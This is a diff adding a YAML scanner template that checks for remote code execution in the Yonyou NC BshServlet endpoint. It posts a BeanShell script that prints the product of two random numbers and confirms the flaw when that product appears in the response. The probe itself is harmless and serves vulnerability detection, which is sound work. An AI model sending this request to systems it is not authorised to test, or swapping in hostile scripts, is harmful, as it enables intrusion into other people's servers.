@@ -1,0 +1,24 @@
+id: poc-yaml-yonyou-nc-bsh-servlet-bshservlet-rce
+info:
+  name: Yonyou Nc Bsh Servlet Bshservlet 远程代码执行漏洞
+  severity: high
+  tags:
+  - rce
+  - 两高一弱
+  finger: Yonyou
+  reference: []
+  description: null
+variables:
+  r1: random_int(8000, 9999)
+  r2: random_int(8000, 9999)
+transport: http
+requests:
+- method: POST
+  path: /servlet/~ic/bsh.servlet.BshServlet
+  headers: {}
+  data: bsh.script=print%28{{.r1}}*{{.r2}}%29%3B
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r1 * r2)
+  output: []
